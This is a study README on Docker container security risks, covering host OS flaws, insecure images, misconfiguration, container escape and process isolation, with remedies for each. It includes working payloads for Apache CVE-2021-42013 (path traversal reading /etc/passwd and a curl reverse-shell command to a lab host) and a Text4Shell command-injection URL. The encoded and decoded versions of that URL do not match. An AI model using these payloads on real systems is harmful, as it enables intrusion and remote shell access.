# Container-Security (Docker & Kubernetes)
## Docker: OWASP Top 10
<details> 
<summary> 1: Host OS Vulnerabilities </summary>
  
- If Host OS have vulnerabilities, attacker can use it to gain access to containers and apps running inside them.
- Resolution: Regular patching of host OS, Usage of IDS, Firewall, Implement strict access controls

#### CVE-2021-42013 (Path Traversal + RCE + Reverse Shell Attack)
- An attacker could use a path traversal attack to map URLs to files outside the directories. If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these pathes, this could allow for remote code execution.
- This issue affects Apache 2.4.49 and Apache 2.4.50 and not earlier versions.
- Path Traversal payload - ``` http://172.17.0.2:80/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd ```
- Actual payload After double URL decode - ``` http://172.17.0.2:80/cgi-bin/../../../../../../../etc/passwd ```
- Netcat listening on ``` $ nc -lvnp 4444  ```
- RCE Payload: ``` $ curl -s --path-as-is -d "echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/172.17.0.1/4444 0>&1" "http://172.17.0.3:80/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/bash" ```
- References: https://github.com/twseptian/cve-2021-42013-docker-lab
</details>

<details> 
<summary> 2: Insecure Container Images </summary>
  
- By compromising the insecure container images, attacker can gain access to applications. 
- Resolution: Implementation of Image Scannings (To identify vulnerabilities) and Signature Validations (to ensure Images are Trusted)
- Best practises: Use minimal base images that conbtain only necessary libraries

#### CVE-2022-42889 (Command Injection)
- The vulnerability exists in the StringSubstitutor interpolator object. An interpolator is created by the StringSubstitutor.createInterpolator() method and will allow for string lookups as defined in the StringLookupFactory. This can be used by passing a string “${prefix:name}” where the prefix is the aforementioned lookup. Using the “script”, “dns”, or “url” lookups would allow a crafted string to execute arbitrary scripts when passed to the interpolator object.
- This issue affects Apache Commons Text versions 1.5 through 1.9.
- Cmd Injection URL Payload - ```https://your-target.com/exploit?search=%24%7Burl%3AUTF-8%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27touch+%2Ttmp%2Fhelloworld%27%29%7d ```
- Actual payload after decode - ```https://your-target.com/exploit?search=${script:javascript:java.lang.Runtime.getRuntime().exec('touch helloworld')} ```
- After successful execution a file helloworld will be created in app server.
- References: https://github.com/devenes/text4shell-cve-2022-42889
</details>

<details> 
<summary> 3: Insecure Container Configurations </summary>
  
- Misconfigurations may lead to disclose of sensitive date.
- Resolution: Implementation security measures like runtime security amd configuration management.
- Best practises: Implementation of Network segmentation, process isolation and orchestratrion (like kubernetes have default security measures)
- Best Practises: Add necessary access / remove unnecessary access like below examples:
drops capability to modify time -- ``` docker run --cap-drop=SYS_TIME -d my-image ```
Adds Network Bind Service -- ``` docker run --cap-add=NET_BIND_SERVICE -d my-image ```
- Conduct security assessments.
  
### Example: 
- We can set environment variables in Docker file. Setting credentails as Environment variables may disclose them.
</details>


<details> 
<summary> 4: Container Escape Vulnerabilities </summary>
  
- Breaking out from the container is known as "container escape". It allows an attacker to escape from a container to other container or underlying host and gain access to them.
- Option like --privileged may give access to all host systems. It is the same as executing a process with root privileges on the host machine.
``` docker run --privileged -it --name my-container my-image ```
- Resolution: Implementation security measures like runtime security and process isolation
- Best practises: Implementation of orchestratrion (like kubernetes have default security measures)
- Best Practises: Keep containers updated.
- Conduct security assessments.

</details>

<details> 
<summary> 5: Inadequate Process Isolation </summary>
  
- Process running in different conmtainers may interact with each other. 
- This can lead to cross container compromise and data breaches.
- Resolution: Implementation process isolation through Namespace isolation (It Isolates Network, File system) and cgroups (Helps to limit resources that container can consume like CPU, memory, I/O)
- Best practises: Implementation of orchestratrion (like kubernetes have default security measures)
- Use option --pid when starting the container. Process runnin gunder the pid cannot access process on host system. 
``` docker run --pid=container -d my-image ```
- Limit CPU usage when starting container.
``` docker run --cpu-share=512 --memory=512m --memory-swap=1g -d my-image ```  

### Cross Container Compromise with SYS_PTRACE capability
- SYS_PTRACE is a linux kernal process / capability which traces and debugs other process. It can reads / modifies memory, registry and extract sensitive data.

</details>
